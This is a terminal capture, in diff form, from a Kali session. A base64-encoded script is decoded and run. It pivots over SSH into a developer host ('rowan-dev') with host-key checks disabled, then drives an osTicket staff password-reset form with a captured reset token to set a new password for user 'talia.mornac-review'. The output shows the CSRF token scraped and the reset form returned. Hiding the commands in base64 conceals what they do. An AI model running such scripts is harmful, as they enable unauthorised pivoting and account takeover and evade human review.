@@ -1,0 +1,20 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r8.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2NrNS50eHQ7IHJtIC1mICRKClRPS0VOPWsxNy10YWxpYS1tb3JuYWMtcmV2aWV3LXRva2VuLTI4NDEKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1jICRKIC1iICRKICIkQi9zY3AvcHdyZXNldC5waHA/dG9rZW49JFRPS0VOIiAtbyAvdG1wL3MxLmh0bWwKVDE9JChncmVwIC1vRSAnbmFtZT0iX19DU1JGVG9rZW5fXyIgdmFsdWU9IlteIl0rIicgL3RtcC9zMS5odG1sIHwgc2VkIC1FICdzLy4qdmFsdWU9IihbXiJdKykiLiovXDEvJykKZWNobyAiU1RFUDEgVE9LPSRUMSIKZWNobyAiPT09IFNURVAyIFBPU1QgdXNlcmlkID09PSIKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKIC1YIFBPU1QgIiRCL3NjcC9wd3Jlc2V0LnBocCIgXAogLS1kYXRhLXVybGVuY29kZSAiX19DU1JGVG9rZW5fXz0kVDEiIC0tZGF0YS11cmxlbmNvZGUgImRvPW5ld3Bhc3N3ZCIgLS1kYXRhLXVybGVuY29kZSAidG9rZW49JFRPS0VOIiBcCiAtLWRhdGEtdXJsZW5jb2RlICJ1c2VyaWQ9dGFsaWEubW9ybmFjLXJldmlldyIgLS1kYXRhLXVybGVuY29kZSAic3VibWl0PUxvZ2luIiAtbyAvdG1wL3MyLmh0bWwgLWkgfCBoZWFkIC0xNQplY2hvICItLS0gczIgZm9ybXMgLS0tIjsgZ3JlcCAtb0UgJzxmb3JtW14+XSo+fDxpbnB1dFtePl0qPnw8aDM+W148XSonIC90bXAvczIuaHRtbAplY2hvICItLS0gczIgdGV4dCAtLS0iCnB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IHJlLGh0bWwKZD1vcGVuKCcvdG1wL3MyLmh0bWwnLGVycm9ycz0naWdub3JlJykucmVhZCgpCmQ9cmUuc3ViKHInPHNjcmlwdC4qPzwvc2NyaXB0PicsJycsZCxmbGFncz1yZS5TKTsgZD1yZS5zdWIocic8c3R5bGUuKj88L3N0eWxlPicsJycsZCxmbGFncz1yZS5TKQp0PXJlLnN1YihyJzxbXj5dKz4nLCcgJyxkKTsgdD1odG1sLnVuZXNjYXBlKHQpOyB0PXJlLnN1YihyJ1xzKycsJyAnLHQpCnByaW50KHRbOjE1MDBdKQpQWQpJTk5FUgo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r8.sh; bash /tmp/r8.sh; echo DONEMARK_1795194764759$((6*7))
+STEP1 TOK=54d496552f41f663282d507a83a6efcd7dd554a1
+=== STEP2 POST userid ===
+--- s2 forms ---
+<h3>
+<form action="pwreset.php" method="post">
+<input type="hidden" name="__CSRFToken__" value="54d496552f41f663282d507a83a6efcd7dd554a1" />
+<input type="hidden" name="do" value="newpasswd"/>
+<input type="hidden" name="token" value="k17-talia-mornac-review-token-2841"/>
+<input class="submit" type="submit" name="submit" value="Login"/>
+--- s2 text ---
+HTTP/1.1 200 OK Server: nginx Date: Fri, 20 Nov 2026 17:18:02 GMT Content-Type: text/html; charset=utf-8 Content-Length: 2619 Connection: keep-alive X-Powered-By: PHP/8.4.27 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Security-Policy: frame-ancestors 'self'; script-src 'self' 'unsafe-inline'; object-src 'none' Vary: Accept-Encoding osTicket :: Agent Login Copyright © FieldKest Support Powered by 
